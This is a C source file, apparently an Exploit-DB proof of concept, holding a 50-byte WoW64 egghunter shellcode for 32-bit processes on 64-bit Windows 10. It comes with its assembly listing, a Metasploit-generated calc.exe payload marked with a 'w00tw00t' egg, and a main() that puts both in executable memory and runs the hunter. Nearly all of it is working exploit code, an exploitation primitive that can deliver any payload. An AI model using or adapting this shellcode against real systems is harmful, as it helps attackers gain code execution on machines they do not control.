#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
using namespace std;

/*

Title: WoW64Egghunter for Windows 10 (32bit apps on 64bit Windows 10)
Size: 50 bytes
Date: 26/08/2018
Author: n30m1nd - https://www.exploit-db.com/author/?a=8766
Works in: 32 bit processes on a 64 bit Windows 10 OS
How to: Compile under Visual Studio and run

Credit where credit is due:
- https://www.corelan.be/index.php/2011/11/18/wow64-egghunter/
- https://j00ru.vexillium.org/syscalls/nt/64/
- https://www.exploit-db.com/exploits/41827/
- https://web.archive.org/web/20101215052055/http://vx.netlux.org/lib/vrg02.html

Shouts out to the Plakkers!

// Assembly

0:  8c cb                   mov    ebx,cs
2:  80 fb 23                cmp    bl,0x23
5:  33 d2                   xor    edx,edx
7:  66 81 ca ff 0f          or     dx,0xfff
c:  33 db                   xor    ebx,ebx
e:  42                      inc    edx
f:  52                      push   edx
10: 53                      push   ebx
11: 53                      push   ebx
12: 53                      push   ebx
13: 6a 29                   push   0x29
15: 58                      pop    eax
16: b3 c0                   mov    bl,0xc0 ; Heaven's gate
18: 64 ff 13                call   DWORD PTR fs:[ebx]
1b: 83 c4 0c                add    esp,0xc
1e: 5a                      pop    edx
1f: 3c 05                   cmp    al,0x5
21: 74 e4                   je     0x7
23: b8 77 30 30 74          mov    eax,0x74303077
28: 89 d7                   mov    edi,edx
2a: af                      scas   eax,DWORD PTR es:[edi]
2b: 75 e1                   jne    0xe
2d: af                      scas   eax,DWORD PTR es:[edi]
2e: 75 de                   jne    0xe
30: ff e7                   jmp    edi
*/

char n30m1ndhunter[] =
"\x8C\xCB\x80\xFB\x23\x33\xD2\x66\x81\xCA\xFF\x0F"
"\x33\xDB\x42\x52\x53\x53\x53\x6A\x29\x58\xB3\xC0"
"\x64\xFF\x13\x83\xC4\x0C\x5A\x3C\x05\x74\xE4\xB8"
"\x77\x30\x30\x74\x89\xD7\xAF\x75\xE1\xAF\x75\xDE"
"\xFF\xE7";

// msfvenom -p windows/exec cmd=calc.exe -f c
char scode[] = "w00tw00t" // Eggu
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

int main(int argc, char **argv)
{
	// Place the eggu (w00tw00t) in memory and make the shellcode executable
	void *eggfind = VirtualAlloc(0, sizeof scode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(eggfind, scode, sizeof scode);

	// Place the egghunter shellcode in memory and ...
	void *exec = VirtualAlloc(0, sizeof n30m1ndhunter, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, n30m1ndhunter, sizeof n30m1ndhunter);

	// ... jump to it
	((void(*)())exec)();
}